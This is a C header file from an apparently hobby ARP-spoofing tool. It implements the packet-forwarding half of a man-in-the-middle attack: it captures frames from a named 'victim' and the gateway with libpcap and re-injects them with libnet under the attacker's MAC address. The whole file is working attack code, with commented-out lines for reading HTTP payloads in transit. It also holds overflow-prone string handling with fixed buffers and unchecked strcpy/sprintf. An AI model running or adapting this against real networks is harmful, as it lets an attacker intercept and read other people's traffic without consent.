/*
* MODULE: forward packet get from victim and gateway
* MAIN FUNCTION: Arpforward
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __PACKET_FORWARDER_H_
#define __PACKET_FORWARDER_H_

#include "head.h"

/* replace string */
int str_replace(char* str,char* str_src, char* str_des) {
    char *ptr = NULL;
    char buff[65536];
    char buff2[65536];
    int i = 0;
    
    if (str != NULL) {
        strcpy(buff2, str);
    }
    else
        return -1;
    memset(buff, 0x00, sizeof(buff));
    while ((ptr = strstr( buff2, str_src)) != 0) {
        if (ptr - buff2 != 0) memcpy(&buff[i], buff2, ptr - buff2);
        memcpy(&buff[i + ptr - buff2], str_des, strlen(str_des));
        i += ptr - buff2 + strlen(str_des);
        strcpy(buff2, ptr + strlen(str_src));
    }
    strcat(buff,buff2);
    strcpy(str,buff);
    return 0;
}

int forward_to_victim(char *dev, u_short pro_type, u_char *ether_dst, u_char *ether_src,
u_char *ip_dst, u_char *ip_src, ip_header *ip, tcp_header *tcp, const u_char *payload, int len, int Times) {

    /* definations */
    libnet_t *net_t = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;
    char src[15], dst[15];
    sprintf(src, "%d.%d.%d.%d", ip_src[0], ip_src[1], ip_src[2], ip_src[3]);
    sprintf(dst, "%d.%d.%d.%d", ip_dst[0], ip_dst[1], ip_dst[2], ip_dst[3]);

    /* get ip str*/
    u_long src_ip, dst_ip;
    dst_ip = libnet_name2addr4(net_t, dst, LIBNET_RESOLVE);
    src_ip = libnet_name2addr4(net_t, src, LIBNET_RESOLVE);

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build TCP options */
    //p_tag = libnet_build_tcp_options(payload, len, net_t, 0);
    //if (p_tag == -1) {
    //    printf("TCP options build error\n");
    //    libnet_destroy(net_t);
    //    return 1;
    //}

    /* build TCP */
    p_tag = libnet_build_tcp(tcp->sour_port, tcp->dest_port, tcp->sequ_num, tcp->ackn_num,
    tcp->header_len_flag, tcp->window, 0, tcp->surg_point, 20 + len, payload, len, net_t, 0);
    
    if (p_tag == -1) {
        printf("TCP build error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* build IP */
    p_tag = libnet_build_ipv4(40 + len, ip->type_of_service, ip->packet_id, ip->slice_info  ,
    ip->TTL, PROTOCOL_TCP, 0, src_ip, dst_ip, NULL, 0, net_t, 0);
    libnet_do_checksum(net_t, (u_int8_t*)net_t, PROTOCOL_TCP, 40 + len);
    if (p_tag == -1) {
        printf("IP build error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* build ether */
    p_tag = libnet_build_ethernet(ether_dst, ether_src, pro_type, NULL, 0, net_t, 0);
    if (p_tag == -1) {
        printf("ether build error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    for (int i = 0; i < Times; i++) {
        res = libnet_write(net_t);
        if (res == -1) {
            printf("IP libnet write error\n");
            libnet_destroy(net_t);
            return 1;
        }
    }
    
    /* success */
    libnet_destroy(net_t);
    return 0;
}

int forward_to_gateway(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char *payload, int len, int Times) {

    /* definations */
    libnet_t *net_t = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(DST, SRC, pro_type, payload, len, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    for (int i = 0; i < Times; i++) {
        res = libnet_write(net_t);
        if (res == -1) {
            printf("IP libnet write error\n");
            libnet_destroy(net_t);
            return 1;
        }
    }
    
    /* success */
    libnet_destroy(net_t);
    return 0;
}

void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) {

    /* get args */
    MITM_info MITM_arg = *(MITM_info *)arg;
    int Times = 1;
    u_short type = EPT_IPv4;
    char *dev = MITM_arg.dev;
    u_char *victim_mac = MITM_arg.TARGET_MAC;
    u_char *gateway_mac = MITM_arg.GATEWAY_MAC;
    u_char *attacker_mac = MITM_arg.ATTACKER_MAC;
    u_char *victim_ip = MITM_arg.TARGET_IP;
    u_char *gateway_ip = MITM_arg.GATEWAY_IP;

    /* get packet information */
    ethernet_header *pEther = (ethernet_header *)packet;
    ip_header *pIpv4 = (ip_header *)(packet + 14);
    tcp_header *pTcp = (tcp_header *)(packet + 34);
    char *data = (char *)(packet + 54);
    //char *p = strstr(data, "HTTP");

    /* get packet form victim */
    if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
        printf("Get packet from victim\n");
        //if (p != NULL) printf("%s\n", p);
        forward_to_gateway(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
    }
    else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
        printf("Get packet from gateway\n");
        //if (p != NULL) printf("%s\n", p);
        forward_to_gateway(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
        //forward_to_victim(dev, type, victim_mac, attacker_mac, victim_ip, gateway_ip, pIpv4, pTcp, packet + 54, hp->len - 54, Times);
    }
}

int forward_packet(void *ARG) {

    /* defination */
    MITM_info arg = *(MITM_info *)ARG;
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;
    
    /* start dev */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    arg.dev = dev;

    /* open device */
    pcap_t *handle = pcap_open_live(dev, 65535, 1, 0, errbuf);
    if (!handle) {
        printf("device open error.\n");
        exit(1);
    }

    /* compile filter */
    pcap_compile(handle, &filter, arg.filter, 1, 0);  
    pcap_setfilter(handle, &filter);

    /* capture packets */
    pcap_loop(handle, -1, getPacket, (u_char *)&arg);

    /* end */
    pcap_close(handle);

    return 0;
}

#endif